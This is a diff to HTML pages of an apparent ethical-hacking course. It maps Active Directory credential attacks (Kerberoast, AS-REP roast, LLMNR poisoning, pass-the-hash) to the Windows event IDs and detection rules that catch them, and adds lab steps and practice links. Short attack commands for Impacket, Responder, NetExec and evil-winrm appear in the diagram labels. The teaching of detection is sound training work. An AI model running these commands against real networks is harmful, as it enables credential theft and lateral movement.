-          <rect x="490" y="204" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#4ade80"/>
-          <text class="d-sub" x="508" y="226">a host answering LLMNR for names it doesn't own</text>
-          <text class="d-sub" x="508" y="246">canary lookup fires; NetNTLMv2 auth to a rogue host</text>
-          <text class="d-sub" x="508" y="264">network/EDR detection, not one Event ID</text>
-          <path d="M450,237 L488,237" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="lg-kroast" tabindex="0">
+            <rect x="20" y="122" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-lbl" x="38" y="148" font-size="12">Kerberoast · Lab 6</text>
+            <text class="d-sub" x="38" y="168">request service tickets for every SPN</text>
+            <text class="d-sub" x="38" y="183" class="d-mono">impacket-GetUserSPNs -request</text>
+          </g>
+          <rect x="490" y="122" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/>
+          <text class="d-lbl" x="508" y="150" font-size="13" fill="#4ade80" class="d-mono">4769</text>
+          <text class="d-sub" x="566" y="150">ticket requests, one user, many SPNs</text>
+          <text class="d-sub" x="508" y="173">encryption type <tspan class="d-mono">0x17</tspan> (RC4) = the tell</text>
+          <path d="M450,155 L488,155" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <!-- row 3 asrep -->
+          <g class="node" data-node="lg-asrep" tabindex="0">
+            <rect x="20" y="200" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-lbl" x="38" y="226" font-size="12">AS-REP roast · Lab 6b</text>
+            <text class="d-sub" x="38" y="246">no-preauth accounts — no credential needed</text>
+            <text class="d-sub" x="38" y="261" class="d-mono">impacket-GetNPUsers -no-pass</text>
+          </g>
+          <rect x="490" y="200" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/>
+          <text class="d-lbl" x="508" y="228" font-size="13" fill="#4ade80" class="d-mono">4768</text>
+          <text class="d-sub" x="566" y="228">TGT requested, pre-auth type 0</text>
+          <text class="d-sub" x="508" y="251">enc <tspan class="d-mono">0x17</tspan>, for an account that never logs on</text>
+          <path d="M450,233 L488,233" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <!-- row 4 llmnr -->
+          <g class="node" data-node="lg-llmnr" tabindex="0">
+            <rect x="20" y="278" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-lbl" x="38" y="304" font-size="12">LLMNR poison · Lab 5</text>
+            <text class="d-sub" x="38" y="324">answer a broadcast, capture NetNTLMv2</text>
+            <text class="d-sub" x="38" y="339" class="d-mono">responder -I eth0 -wv</text>
+          </g>
+          <rect x="490" y="278" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/>
+          <text class="d-lbl" x="508" y="306" font-size="12.5" fill="#4ade80">network / EDR</text>
+          <text class="d-sub" x="508" y="326">a host answering LLMNR for names it doesn't own</text>
+          <text class="d-sub" x="508" y="341">canary lookup fires — not one Event ID</text>
+          <path d="M450,311 L488,311" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <!-- row 5 pth -->
+          <g class="node" data-node="lg-pth" tabindex="0">
+            <rect x="20" y="356" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-lbl" x="38" y="382" font-size="12">Pass-the-hash · Lab 6</text>
+            <text class="d-sub" x="38" y="402">authenticate with the NT hash, no plaintext</text>
+            <text class="d-sub" x="38" y="417" class="d-mono">nxc smb host -u u -H &lt;hash&gt;</text>
+          </g>
+          <rect x="490" y="356" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/>
+          <text class="d-lbl" x="508" y="384" font-size="13" fill="#4ade80" class="d-mono">4624 · Logon 3</text>
+          <text class="d-sub" x="620" y="384">NTLM in-domain</text>
+          <text class="d-sub" x="508" y="407">unusual host+account pair; + <tspan class="d-mono">4776</tspan> NTLM validation</text>
+          <path d="M450,389 L488,389" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
         </svg>
-        <figcaption><b>Orange did it, green saw it.</b> Every credential attack has a matching auth-log signature — which
-           is why authentication is where detection pays off most.</figcaption>
+        <div class="dgm-hint">Click each attack — the exact log signature and the rule tell you key on in Lab 7.</div>
+        <div class="dgm-detail" data-detail="lg-spray"><h5><span class="dd-tag">T1110.003 · SPRAY → 4625</span>The one-to-many signature</h5><p><b>One source IP, one password, many TargetUserName, a short window.</b> The rule keys on <em>fan-out</em>: <span class="mono">count(distinct TargetUserName) by IpAddress ≥ 10 within 5 min</span>, status <span class="mono">0xC000006A</span> (bad password). Add <span class="mono">4771/4768</span> Kerberos pre-auth failures (status 0x18) for the AD-side view.</p></div>
+        <div class="dgm-detail" data-detail="lg-kroast"><h5><span class="dd-tag">T1558.003 · KERBEROAST → 4769</span>RC4 is the tell</h5><p><b>One account requests service tickets for many SPNs, seconds apart, with encryption type <span class="mono">0x17</span> (RC4).</b> Legitimate traffic is AES (<span class="mono">0x12</span>). Rule: <span class="mono">4769 + TicketEncryptionType=0x17</span> + high distinct-SPN count per account. This is the rule most students pick in Lab 7.</p></div>
+        <div class="dgm-detail" data-detail="lg-asrep"><h5><span class="dd-tag">T1558.004 · AS-REP ROAST → 4768</span>Pre-auth disabled</h5><p><b>A TGT request (<span class="mono">4768</span>) with pre-authentication type 0 and enc <span class="mono">0x17</span></b>, often for a service/legacy account that never logs on interactively. No failed logons precede it — the attacker needed no credential. Rule: <span class="mono">4768 + PreAuthType=0 + 0x17</span>.</p></div>
+        <div class="dgm-detail" data-detail="lg-llmnr"><h5><span class="dd-tag">T1557.001 · LLMNR POISON → network</span>No single Event ID</h5><p><b>There is no clean host log — this one is caught on the wire or by a decoy.</b> Plant a <em>canary</em> name nobody should ever resolve; if anything answers the LLMNR/mDNS broadcast, alarm. EDR also flags a workstation authenticating (NetNTLMv2) to a rogue host it has never contacted before.</p></div>
+        <div class="dgm-detail" data-detail="lg-pth"><h5><span class="dd-tag">T1550.002 · PASS-THE-HASH → 4624</span>NTLM where Kerberos belongs</h5><p><b>A successful logon (<span class="mono">4624</span>, LogonType 3) using <span class="mono">NTLM</span> inside a domain that normally speaks Kerberos</b>, from an unusual source-host / account pairing, paired with <span class="mono">4776</span> (NTLM credential validation). The crack step is skipped, so there are <em>no</em> preceding failures — the tell is the anomaly, not a burst.</p></div>
+        <figcaption><b class="hl hl-d">Orange did it, green saw it.</b> Every credential attack has a matching auth-log signature — click each to see the exact field you key a rule on. This is the map behind Lab 7.</figcaption>
       </figure>
       <div class="sim sim-evt">
   <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">Event Viewer — Security</span><span class="sim-tool">DC01 · ceh.lab</span></div>
   <div class="sim-body">
-    <table><thead><tr><th>Level</th><th>Time</th><th>Event ID</th><th>Service (SPN) requested</th><th>Ticket Enc.</th></tr></thead>
+    <table><colgroup><col style="width:20%"><col style="width:16%"><col style="width:15%"><col style="width:29%"><col style="width:20%"></colgroup><thead><tr><th>Level</th><th>Time</th><th>Event ID</th><th>Service (SPN) requested</th><th>Ticket Enc.</th></tr></thead>
     <tbody>
       <tr class="hlrow"><td class="lvl-i">Information</td><td>15:41:10</td><td class="k">4769</td><td>MSSQL/dc.ceh.lab</td><td class="lvl-f">0x17 · RC4</td></tr>
       <tr class="hlrow"><td class="lvl-i">Information</td><td>15:41:10</td><td class="k">4769</td><td>HTTP/web.ceh.lab</td><td class="lvl-f">0x17 · RC4</td></tr>
@@ -2018,7 +2419,7 @@ evil-winrm -i 192.168.56.20 -u svc_backup -p '&lt;cracked&gt;'  # interactive Po
       <div class="box intro">
         <span class="box-t">Why this is the exercise that defines the session</span>
         <p>Nothing in the diploma closes the loop this cleanly. You generated the evidence in Labs 4–6. Now you'll read it
-           as a defender, identify the attack from the evidence <em>alone</em>, and write one <strong>working detection
+           as a defender, identify the attack from the evidence <em>alone</em>, and write one <strong class="hl">working detection
            rule</strong> that would fire on it. This is, almost exactly, the tier-1-into-tier-2 SOC job — and you'll have
            done the attack and the detection for the same events.</p>
       </div>
@@ -2033,7 +2434,7 @@ evil-winrm -i 192.168.56.20 -u svc_backup -p '&lt;cracked&gt;'  # interactive Po
       <h2><span class="h-t">Step 1 — identify the attack from evidence alone</span></h2>
       <ol class="steps">
         <li>
-          <strong>Read the log without looking at your commands.</strong> Which attack was this?
+          <strong class="hl hl-d">Read the log without looking at your commands.</strong> Which attack was this?
           <pre><code># in Event Viewer, filter the Security log to 4625; or from PowerShell:
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} |
   Group-Object {$_.Properties[5].Value} | Sort-Object Count -Descending
@@ -2189,7 +2590,7 @@ tags:
           </div>
         </li>
         <li>
-          <strong>Pick the single chosen way in per host</strong> — the one Session 5 will execute — with a one-line reason.
+          <strong class="hl">Pick the single chosen way in per host</strong> — the one Session 5 will execute — with a one-line reason.
           <div class="verify">
             <h4>✓ Verification</h4>
             <ul>
@@ -2258,7 +2659,7 @@ tags:
         </svg>
         <div class="dgm-hint">Click each — why one connects and one doesn't.</div>
         <div class="dgm-detail" data-detail="bind"><h5><span class="dd-tag">BIND</span>Attacker connects in</h5><p><b>The target opens a listening port; the attacker connects to it.</b> Simple — but inbound connections are almost always blocked by the target's firewall, so it usually fails on a real network. Use it only when you control the path in.</p></div>
-        <div class="dgm-detail" data-detail="rev"><h5><span class="dd-tag">REVERSE</span>Target calls back</h5><p><b>The target connects out to the attacker's waiting listener.</b> Outbound is almost always allowed (that's how the box browses the web), so it bypasses inbound firewall rules. This is why Session 5's payloads "call back" — reverse is the default for a reason.</p></div>
+        <div class="dgm-detail" data-detail="rev"><h5><span class="dd-tag">REVERSE</span>Target calls back</h5><p><b class="hl">The target connects out to the attacker's waiting listener.</b> Outbound is almost always allowed (that's how the box browses the web), so it bypasses inbound firewall rules. This is why Session 5's payloads "call back" — reverse is the default for a reason.</p></div>
       </figure>
 
       <div class="box note">
@@ -2387,7 +2788,7 @@ tags:
           <li><div class="pr-row"><a href="https://tryhackme.com/room/openvas" target="_blank" rel="noopener">OpenVAS</a><span class="res-tag free">Free</span><span class="pr-meta">~45 min · easy</span></div><p class="pr-note">Automated scanning with Greenbone/GVM — the free stand-in for the Nessus demo (the <span class="mono">nessus</span> room is private).</p></li>
           <li><div class="pr-row"><a href="https://tryhackme.com/room/crackthehash" target="_blank" rel="noopener">Crack the Hash</a><span class="res-tag free">Free</span><span class="pr-meta">~45 min · easy</span></div><p class="pr-note">Identify and crack every common hash type with hashcat + John — pure reps on the pipeline from P13/P15.</p></li>
           <li><div class="pr-row"><a href="https://tryhackme.com/room/hydra" target="_blank" rel="noopener">Hydra</a><span class="res-tag free">Free</span><span class="pr-meta">~45 min · easy</span></div><p class="pr-note">Online brute-force against real services — the hydra block, hands-on.</p></li>
-          <li><div class="pr-row"><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">Attacktive Directory</a><span class="res-tag free">Free</span><span class="pr-meta">~75 min · medium</span></div><p class="pr-note"><b>The one to prioritise.</b> User enum → AS-REP roast → Kerberoast → secretsdump → evil-winrm: the exact chain from Labs 5–6 against a fresh domain.</p></li>
+          <li><div class="pr-row"><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">Attacktive Directory</a><span class="res-tag free">Free</span><span class="pr-meta">~75 min · medium</span></div><p class="pr-note"><b class="hl">The one to prioritise.</b> User enum → AS-REP roast → Kerberoast → secretsdump → evil-winrm: the exact chain from Labs 5–6 against a fresh domain.</p></li>
           <li><div class="pr-row"><a href="https://tryhackme.com/room/networkservices2" target="_blank" rel="noopener">Network Services 2</a><span class="res-tag free">Free</span><span class="pr-meta">~60 min · easy</span></div><p class="pr-note">Service enumeration + hydra against them — carries over from Session 3, good warm-up for the online-attack half.</p></li>
         </ul>
       </div>
@@ -2432,12 +2833,12 @@ tags:
     <div class="content">
 
       <ul class="takeaways">
-        <li><strong>Attackers log in.</strong> A missing patch, a reused password, a weak service account, a workstation that trusts a broadcast — each hands you a credential or a known exploit. You rarely "break" anything.</li>
+        <li><strong class="hl">Attackers log in.</strong> A missing patch, a reused password, a weak service account, a workstation that trusts a broadcast — each hands you a credential or a known exploit. You rarely "break" anything.</li>
         <li><strong>A hash is guessed, not reversed.</strong> One-way, no key. Weak passwords fall because they're in the wordlist; strong ones don't because they aren't.</li>
         <li><strong>Know what crosses the wire.</strong> NetNTLMv2 (Responder, -m 5600) is not the NT hash (SAM, -m 1000). Wrong mode, wasted hour.</li>
         <li><strong>Kerberos leaks in two places.</strong> AS-REP roast (no pre-auth, -m 18200) and Kerberoast (any user, -m 13100) — both need only a low-priv account.</li>
-        <li><strong>Spraying beats brute-force.</strong> One password, many accounts, under the lockout threshold. It only takes one reused password in the whole org.</li>
-        <li><strong>You don't always crack.</strong> Pass-the-hash: the NT hash <em>is</em> the credential.</li>
+        <li><strong class="hl">Spraying beats brute-force.</strong> One password, many accounts, under the lockout threshold. It only takes one reused password in the whole org.</li>
+        <li><strong class="hl">You don't always crack.</strong> Pass-the-hash: the NT hash <em>is</em> the credential.</li>
         <li><strong>Every credential attack is loud.</strong> 4625 (spray), 4769/0x17 (Kerberoast), a poisoned broadcast — and you wrote the rule that catches them. That detection half is the job.</li>
         <li><strong>Verify the tool is still alive.</strong> Nessus Essentials is 5 IPs now (not 16); LLMNR is still on by default in 2026; Impacket is Fortra's. Check before you quote.</li>
       </ul>
